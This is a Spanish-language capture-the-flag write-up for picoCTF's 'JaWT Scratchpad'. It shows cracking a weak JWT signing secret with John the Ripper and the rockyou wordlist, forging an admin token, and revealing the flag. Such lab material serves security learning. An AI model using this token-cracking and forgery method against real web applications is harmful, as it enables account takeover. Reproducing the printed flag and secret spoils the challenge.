## Descripción
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/61864/` or http://jupiter.challenges.picoctf.org:61864
## Solución
1. Intentamos ingresar al sitio como `admin` y nos manda este mensaje
```html
# Welcome to JaWT!

JaWT is an online scratchpad, where you can "jot" down whatever you'd like! Consider it a notebook for your thoughts. **JaWT works best in Google Chrome for some reason.**

YOU CANNOT LOGIN AS THE ADMIN! HE IS SPECIAL AND YOU ARE NOT.

You will need to log in to access the JaWT scratchpad. You can use any name, other than `admin`... because the `admin` user gets a special scratchpad!
```
2. Si vemos en las cookies del método GET está un token jwt
```
jwt:"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaG9sYSJ9.1qAyT2PR4ePRCSDgOLDq_hlVOEPfaJbxiGrAooaupFw"
```
3. Podemos decodificar usando https://jwt.io/ o con el comando `base64 -d`
```JSON
HEADER:ALGORITHM & TOKEN TYPE
{
  "typ": "JWT",
  "alg": "HS256"
}
PAYLOAD:DATA
{
  "user": "hola"
}
```
4. Instalamos wordlists
```shell
sudo apt install wordlists
```
5. Vamos al directorio donde está  wordlists
```shell
┌──(tux㉿kali)-[/usr/share/wordlists]
└─$ ls
john.lst  rockyou.txt.gz
```
6. Descomprimimos wordlists
```shell
┌──(tux㉿kali)-[/usr/share/wordlists]
└─$ sudo gzip -d rockyou.txt.gz
```
7. Hacemos un archivo llamado `hash` y guardamos el token 
```shell
nano hash
```
8. Usamos Jhon the riper para encontrar la palabra clave
```shell
┌──(tux㉿kali)-[~]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)
1g 0:00:00:00 DONE (2025-03-27 15:11) 1.369g/s 10133Kp/s 10133Kc/s 10133KC/s iluve.p..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
9. Firmamos el toquen colocando que somos el admin y colocando la palabra clave
```shell
{
  "sub": "1234567890",
  "name": "admin",
  "iat": 1516239022
}
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  ilovepico
)

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
```
10. Colocamos el valor del JWT y obtenemos la bandera 
```
picoCTF{jawt_was_just_what_you_thought_1ca14548}
```
## Notas adicionales
El ejercicio fue resuelto en un navegador basado en chromium
## Referencias
https://www.ibm.com/docs/es/cics-ts/6.x?topic=cics-json-web-token-jwt
https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a
https://github.com/openwall/john
https://www.youtube.com/watch?v=I7gQTBYmEEg
https://www.delftstack.com/es/howto/linux/unzip-gz-file-linux/#google_vignette